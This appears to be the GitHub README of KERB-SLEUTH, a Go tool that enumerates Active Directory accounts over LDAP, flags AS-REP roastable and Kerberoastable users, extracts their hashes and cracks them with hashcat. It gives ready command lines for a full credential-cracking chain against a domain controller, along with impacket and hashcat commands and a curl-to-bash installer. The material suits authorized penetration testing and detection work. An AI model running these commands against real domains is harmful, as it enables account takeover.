```
â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—      â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â•â•â•â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•       â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•    â•šâ•â•   â•šâ•â•  â•šâ•â•
```

<div align="center">

# ğŸ”¥ KERB-SLEUTH ğŸ”¥
### **Active Directory Kerberos Security Scanner**

[![GitHub license](https://img.shields.io/github/license/thechosenone-shall-prevail/KERB-SLEUTH?style=for-the-badge&color=darkred)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/blob/main/LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/thechosenone-shall-prevail/KERB-SLEUTH?style=for-the-badge&color=red)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/stargazers)
[![Go version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)](https://golang.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/releases)

**ğŸ©¸ BLEEDING WINDOWS AUTHENTICATION ğŸ©¸**

*A production-ready, single-binary Go tool for identifying AS-REP and Kerberoastable targets in Active Directory environments. Designed for offline-first operation with safe-by-default behavior.*

</div>

---

## âš ï¸ **LEGAL DISCLAIMER** âš ï¸

```diff
+ This tool is for AUTHORIZED security assessments ONLY!
+ Unauthorized access to computer systems is ILLEGAL and punishable by law.
+ Always ensure you have explicit written permission before using this tool.
+ The authors assume NO LIABILITY for misuse or damage caused by this program.
```

---

## ğŸ¯ **FEATURES**

### ğŸ” **Core Capabilities**
- ğŸ›¡ï¸ **AS-REP Roasting Detection** - Identifies accounts with pre-authentication disabled
- âš¡ **Kerberoasting Detection** - Finds accounts with Service Principal Names (SPNs)
- ğŸ“Š **Intelligent Scoring System** - Configurable heuristics for risk assessment
- ğŸ¨ **Beautiful ASCII Banners** - Random bloody Windows logo displays (msfconsole style)

### ğŸ’¾ **Data Processing**
- ğŸ“ **Multiple Input Formats** - CSV, LDIF, JSON support
- ğŸŒ **Offline-First Design** - Operates primarily on exported AD data
- ğŸ“ˆ **Smart Parsing** - Handles various AD export formats automatically
- ğŸ”„ **Synthetic Data Generator** - Built-in test data creation

### ğŸ“¤ **Output Formats**
- ğŸ“‹ **JSON Reports** - Detailed results with scoring and reasons
- ğŸ“Š **CSV Summaries** - Simplified tabular format for reporting
- ğŸš¨ **Sigma Rules** - Generated detection rules for SIEM integration
- ğŸ”“ **Hash Export** - Optional hash extraction for authorized cracking

### ğŸ›¡ï¸ **Security Features**
- ğŸ”’ **Safe by Default** - Requires explicit authorization for sensitive operations
- ğŸ“ **Comprehensive Logging** - Detailed audit trails
- âš¡ **Single Binary** - Easy deployment with minimal dependencies
- ğŸ¯ **Production Ready** - Robust error handling and validation

---

## ğŸš€ **INSTALLATION**

### ğŸ“¦ **Pre-built Binaries**
```bash
# Download from releases
wget https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/releases/latest/download/kerb-sleuth-linux-amd64
chmod +x kerb-sleuth-linux-amd64
./kerb-sleuth-linux-amd64 --help
```

### ğŸ”¨ **Build from Source**
```bash
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
make build
```

### ğŸ **Kali Linux (Automated)**
```bash
# One-liner install
curl -sSL https://raw.githubusercontent.com/thechosenone-shall-prevail/KERB-SLEUTH/main/quick-install.sh | bash

# Full installation with dependencies
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
chmod +x install-kali.sh
./install-kali.sh
```

### ğŸ³ **Docker**
```bash
# Build and run with Docker
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
./install-docker.sh

# Quick run
./run-docker.sh scan --ad /data/users.csv

# Shell access
./docker-shell.sh

# Docker Compose
docker-compose up -d
docker-compose exec kerb-sleuth ./kerb-sleuth --help
```

---

## âš¡ **QUICK START** 

### ğŸ¯ **LIVE TARGET HUNTING** (Primary Mode)

**Just give it a target IP or hostname - KERB-SLEUTH does the rest!**

```bash
# 1ï¸âƒ£ Basic hunt (anonymous connection)
kerb-sleuth hunt --target 10.0.0.1

# 2ï¸âƒ£ Hunt with domain name  
kerb-sleuth hunt --target dc01.corp.local

# 3ï¸âƒ£ Hunt with credentials (if anonymous fails)
kerb-sleuth hunt --target 10.0.0.1 --user guest --pass ''

# 4ï¸âƒ£ Hunt with SSL and auto-cracking (requires authorization)
kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized
```

### ğŸ”¥ **WHAT HAPPENS AUTOMATICALLY:**

1. **ğŸ” LDAP Connection** - Tries anonymous first, falls back to LDAPS if needed
2. **ğŸ‘¥ User Enumeration** - Pulls all AD users via live LDAP queries  
3. **ğŸ¯ AS-REP Hunting** - Finds accounts with `DoesNotRequirePreAuth=True`
4. **ğŸŸï¸ Kerberoast Hunting** - Finds accounts with Service Principal Names (SPNs)
5. **ğŸ“Š Risk Scoring** - Intelligent scoring based on password age, group membership, etc.
6. **ğŸ’¾ Results Export** - JSON, CSV, and SIEM-ready Sigma rules
7. **ğŸ”“ Auto-Cracking** *(if `--crack` enabled)* - Extracts hashes and runs hashcat with rockyou.txt

### ğŸ“‹ **EXAMPLE OUTPUT:**
```
ğŸ©¸ KERB-SLEUTH v1.0.0 - Kerberos Vulnerability Hunter ğŸ’€

ğŸ”— Attempting to connect to target: 10.0.0.1
âœ… Connected via Anonymous LDAP, Base DN: DC=corp,DC=local  
ğŸ¢ Domain: CORP.LOCAL
ğŸ‘¥ Enumerated 1,337 users from target
ğŸ¯ Found 3 AS-REP candidates
ğŸŸï¸ Found 12 Kerberoast candidates  
ğŸ“Š Results written to: results.json

ğŸ”“ Starting hash extraction and cracking...
ğŸ“„ AS-REP hashes exported to: hashes/asrep_hashes.txt
ğŸ”¨ Starting AS-REP hash cracking with wordlist: /usr/share/wordlists/rockyou.txt  
ğŸ‰ CRACKED PASSWORDS FOUND!
backup_svc:Password123!

âœ… Hunt complete! High: 2 | Medium: 8 | Low: 5 risk targets
ğŸš¨ 2 HIGH RISK targets found! Check results.json for details
```

---

### ğŸ—‚ï¸ **LEGACY FILE ANALYSIS** (Optional)

If you already have exported AD files, you can analyze them offline:

```bash
# Analyze exported CSV/JSON/LDIF files
kerb-sleuth analyze --ad users.csv --out results.json

# Generate test data
kerb-sleuth simulate --dataset small --out tests/sample_data/
```

---

## ğŸ® **USAGE EXAMPLES**

### ğŸ¯ **Live Target Hunting** (Primary Mode)
```bash
# Anonymous hunting (tries LDAP port 389)
kerb-sleuth hunt --target 192.168.1.10

# Specific domain controller  
kerb-sleuth --target dc01.corp.local

# With authentication (if anonymous blocked)
kerb-sleuth hunt --target 10.0.0.1 --user 'CORP\guest' --pass ''
kerb-sleuth hunt --target 10.0.0.1 --user scanner --pass 'P@ssw0rd'

# Secure connection (LDAPS port 636)
kerb-sleuth hunt --target 10.0.0.1 --ssl

# Full attack chain with auto-cracking
kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized
```

### ğŸ”“ **Advanced Hunting & Exploitation**
```bash
# Hunt with custom wordlist
kerb-sleuth hunt --target 10.0.0.1 --crack --wordlist /opt/wordlists/custom.txt --i-am-authorized

# Hunt with multiple outputs
kerb-sleuth hunt --target 10.0.0.1 --csv --siem --crack --i-am-authorized

# Custom configuration
kerb-sleuth hunt --target 10.0.0.1 --config custom-weights.yml
```

### ğŸ“ **File Analysis** (Legacy Mode)
```bash
# Analyze exported AD files
kerb-sleuth analyze --ad users.csv --out results.json
kerb-sleuth analyze --ad export.json --csv --siem

# Generate test data
kerb-sleuth simulate --dataset large --out tests/sample_data/
```

### ğŸ³ **Docker Usage**
```bash
# Run in Docker container
./run-docker.sh hunt --target 10.0.0.1

# Interactive shell
./docker-shell.sh
```

---

## ğŸ“Š **OUTPUT FORMATS**

### ğŸ“‹ **JSON Output**
```json
{
  "summary": {
    "total_users": 1337,
    "asrep_candidates": 13,
    "kerberoast_candidates": 42,
    "high_risk": 7,
    "medium_risk": 23,
    "low_risk": 25
  },
  "candidates": [
    {
      "sam": "backup_svc",
      "type": "ASREP",
      "score": 95,
      "severity": "High",
      "reasons": [
        "DoesNotRequirePreAuth enabled",
        "Password older than 365 days",
        "Member of Domain Admins",
        "Never logged in"
      ],
      "spns": [],
      "pwd_last_set": "2022-01-15T10:30:00Z",
      "member_of": ["CN=Domain Admins,CN=Users,DC=corp,DC=local"],
      "suggested_action": "Disable account or enable pre-authentication"
    },
    {
      "sam": "sql_service",
      "type": "KERBEROAST", 
      "score": 87,
      "severity": "High",
      "reasons": [
        "Multiple SPNs registered",
        "Password older than 180 days",
        "High-value service account"
      ],
      "spns": [
        "MSSQLSvc/sql01.corp.local:1433",
        "MSSQLSvc/sql01.corp.local"
      ],
      "export_hash_path": "exports/kerb_hashes.txt",
      "suggested_action": "Implement Managed Service Accounts (MSA)"
    }
  ]
}
```

### ğŸ“ˆ **CSV Summary**
```csv
SamAccountName,Type,Score,Severity,Reasons,SPNs,ExportHashPath
backup_svc,ASREP,95,High,"DoesNotRequirePreAuth enabled; Password older than 365 days",,
sql_service,KERBEROAST,87,High,"Multiple SPNs registered; Password older than 180 days","MSSQLSvc/sql01.corp.local:1433",exports/kerb_hashes.txt
```

### ğŸš¨ **Sigma Detection Rules**
```yaml
title: AS-REP Roasting Detection
description: Detects potential AS-REP roasting attempts
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: 0
  condition: selection
level: high
```

---

## âš™ï¸ **CONFIGURATION**

### ğŸ“ **Custom Scoring Weights** (`configs/defaults.yml`)
```yaml
weights:
  # AS-REP Roasting Weights
  asrep_base: 50
  asrep_preauth: 30
  asrep_pwd_old: 20
  asrep_admin_group: 25
  asrep_never_login: 15
  asrep_disabled_penalty: -50
  
  # Kerberoasting Weights  
  kerberoast_base: 40
  kerberoast_spn: 25
  kerberoast_multiple_spns: 15
  kerberoast_pwd_old: 20
  kerberoast_high_value: 30

thresholds:
  high: 85
  medium: 60
  low: 30

time:
  pwd_old_days: 90
  pwd_very_old_days: 365
  never_login_days: 30

admin_groups:
  - "CN=Domain Admins"
  - "CN=Enterprise Admins"
  - "CN=Schema Admins"
  - "CN=Administrators"
  - "CN=Backup Operators"

high_value_services:
  - "MSSQLSvc"
  - "HTTP"
  - "LDAP"
  - "CIFS"
  - "HOST"
```

---

## ğŸ› ï¸ **DEVELOPMENT**

### ğŸ§ª **Running Tests**
```bash
# Run all tests
make test

# Run with coverage
make test-coverage

# Run specific package tests
go test ./pkg/ingest -v
```

### ğŸ—ï¸ **Building for Multiple Platforms**
```bash
# Build for all platforms
make build-all

# Specific platform builds
make build-linux
make build-windows
make build-mac
```

### ğŸ“¦ **Docker Development**
```bash
# Build docker image
make docker-build

# Run in container
make docker-run
```

### ğŸš€ **Release Preparation**
```bash
# Automated release preparation
./prepare-release.sh

# Manual steps:
# 1. Update version in go.mod
# 2. Run tests: make test
# 3. Build binaries: make build-all
# 4. Create git tag: git tag v1.0.0
# 5. Push to GitHub: git push origin v1.0.0
# 6. Create GitHub release with binaries
```

---

## ğŸ”¥ **HOW IT WORKS** 

### **Step-by-Step Workflow:**

1. **ğŸ¯ Give it a target:** `kerb-sleuth hunt --target 10.0.0.1`

2. **ğŸ” Auto-Discovery:**
   - Resolves hostname to IP
   - Tries anonymous LDAP connection (port 389)
   - Falls back to LDAPS (port 636) if needed
   - Discovers domain name and base DN

3. **ğŸ‘¥ User Enumeration:**
   - Pulls ALL Active Directory users via live LDAP
   - Extracts user properties (UAC, SPNs, groups, etc.)

4. **ğŸ¯ Vulnerability Detection:**
   - **AS-REP Roasting:** Finds `DoesNotRequirePreAuth=True` accounts
   - **Kerberoasting:** Finds accounts with Service Principal Names (SPNs)

5. **ğŸ“Š Risk Assessment:**
   - Scores based on password age, group membership, account activity
   - Prioritizes high-value targets (Domain Admins, service accounts, etc.)

6. **ğŸ’¾ Results Export:**
   - JSON for detailed analysis
   - CSV for spreadsheet import  
   - Sigma rules for SIEM integration

7. **ğŸ”“ Auto-Exploitation** *(optional with `--crack`)*:
   - Extracts AS-REP hashes (`hashcat -m 18200`)
   - Extracts Kerberoast hashes (`hashcat -m 13100`) 
   - Auto-cracks with `rockyou.txt` wordlist
   - Shows cracked passwords immediately

### **ğŸª No Manual Steps Required!**
- âŒ No need to export AD data manually
- âŒ No need to run separate tools for hash extraction
- âŒ No need to figure out hashcat modes
- âœ… Just point it at a DC and let it hunt!

---

## ğŸ†š **OLD vs NEW WORKFLOW**

### âŒ **Traditional Approach (Complex)**
```bash
# Step 1: Export AD data manually
Get-ADUser -Filter * -Properties * | Export-Csv users.csv

# Step 2: Copy file to attacker machine  
scp users.csv attacker@kali:~/

# Step 3: Analyze with multiple tools
kerb-sleuth analyze --ad users.csv
impacket-GetNPUsers domain.com/user -usersfile users.txt
impacket-GetUserSPNs domain.com/user -request

# Step 4: Extract hashes manually
# Step 5: Run hashcat with correct modes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
```

### âœ… **KERB-SLEUTH Approach (Simple)**
```bash
# One command does everything!
kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized

# That's it! ğŸ‰
# âœ… Enumerates users via live LDAP  
# âœ… Finds AS-REP & Kerberoast targets
# âœ… Extracts hashes automatically
# âœ… Cracks with rockyou.txt
# âœ… Shows results immediately
```

### ğŸš€ **Why KERB-SLEUTH is Better:**
- **ğŸ¯ Point & Shoot:** Just give it a target IP/hostname
- **ğŸ”„ Fully Automated:** No manual export or hash extraction steps  
- **âš¡ Real-time:** Works against live DCs, not just exported files
- **ğŸ§  Intelligent:** Auto-detects connection methods and domains
- **ğŸ”“ Complete:** Finds vulnerabilities AND exploits them
- **ğŸ“Š Professional:** Clean outputs ready for reporting

---

## ğŸ¨ **BANNER GALLERY**

Kerb-Sleuth features multiple random ASCII art banners that display on startup, similar to Metasploit's msfconsole:

- ğŸ©¸ **Bleeding Windows Logo** - Realistic Windows logo with blood dripping effects
- ğŸ’€ **Skull & Crossbones** - Classic hacker aesthetic with blood-red styling  
- ğŸŒ€ **Matrix Style** - Green matrix rain with Kerberos branding
- ğŸ”¥ **Cyber Aesthetic** - Modern cyberpunk design with neon colors
- âš¡ **Minimalist Hacker** - Clean, professional penetration testing look

---

## ğŸ¤ **CONTRIBUTING**

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### ğŸ”’ **Security Policy**
- All contributions must follow security-first principles
- No real credentials or sensitive data in code
- Synthetic test data only
- All destructive operations require explicit authorization

### ğŸ› **Bug Reports**
Found a bug? Please open an issue with:
- Operating system and Go version
- Command that caused the issue
- Expected vs actual behavior
- Sample data (anonymized)

---

## ğŸ“‹ **ROADMAP**

### ğŸš€ **Version 2.0**
- [ ] Live Active Directory integration
- [ ] Real-time monitoring capabilities
- [ ] Advanced machine learning scoring
- [ ] Web dashboard interface
- [ ] Kubernetes deployment

### ğŸ”® **Future Features**
- [ ] BloodHound integration
- [ ] Azure AD support
- [ ] Custom plugin system
- [ ] Distributed scanning
- [ ] Mobile app companion

---

## ğŸ“Š **STATISTICS**

```
Lines of Code: ~2,500
Test Coverage: >85%
Supported Formats: CSV, LDIF, JSON
Output Formats: JSON, CSV, Sigma Rules
Platforms: Windows, Linux, macOS, ARM64
```

---

## ğŸ† **HALL OF FAME**

### ğŸ–ï¸ **Contributors**
- **@thechosenone-shall-prevail** - Project Creator & Lead Developer

### ğŸ™ **Special Thanks**
- Active Directory community for testing and feedback
- Go security community for best practices
- Red team operators for real-world validation

---

## ğŸ“ **SUPPORT**

- ğŸ“š **Documentation**: Check the [Wiki](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/wiki)
- ğŸ’¬ **Discussions**: [GitHub Discussions](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/discussions)  
- ğŸ› **Issues**: [Bug Reports](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/issues)
- ğŸ“§ **Email**: security@[domain] (for security issues only)

---

## ğŸ“œ **LICENSE**

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

<div align="center">

### ğŸ”¥ **REMEMBER: WITH GREAT POWER COMES GREAT RESPONSIBILITY** ğŸ”¥

**Use this tool ethically and legally. Always obtain proper authorization.**

---

*Made with â¤ï¸ and â˜• by [@thechosenone-shall-prevail](https://github.com/thechosenone-shall-prevail)*

**â­ Star this repo if you find it useful! â­**

</div>
